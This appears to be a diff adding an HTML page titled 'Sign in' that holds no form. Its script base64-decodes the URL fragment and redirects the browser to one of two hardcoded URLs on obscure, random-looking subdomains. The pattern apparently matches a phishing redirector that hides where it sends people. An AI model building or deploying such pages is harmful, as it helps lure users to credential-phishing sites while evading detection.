@@ -1,0 +1,29 @@
+<html>
+<head><title>Sign in</title></head>
+<body>
+    <script>
+        // List of allowed domains or paths for redirection
+        const allowedDomains = [
+            'https://wrbxv.mlcros.org/dl7j1/bmh3ns/',
+			'https://xg43dm.logkln.com/qog3tx/p65h7/',
+        ];
+
+        // Retrieve and decode the hash from the URL
+        const encodedHash = window.location.hash.substr(1); // Remove '#'
+        try {
+            // Decode from Base64
+            const decodedUrl = window.atob(encodedHash);
+            
+            // Check if the decoded URL is allowed
+            if (allowedDomains.includes(decodedUrl)) {
+                // Redirect only if it matches an allowed domain or path
+                window.location.href = decodedUrl;
+            } else {
+                console.warn('Unrecognized or unsafe redirect URL');
+            }
+        } catch (error) {
+            console.error('Error decoding the URL:', error);
+        }
+    </script> 
+</body>
+</html>
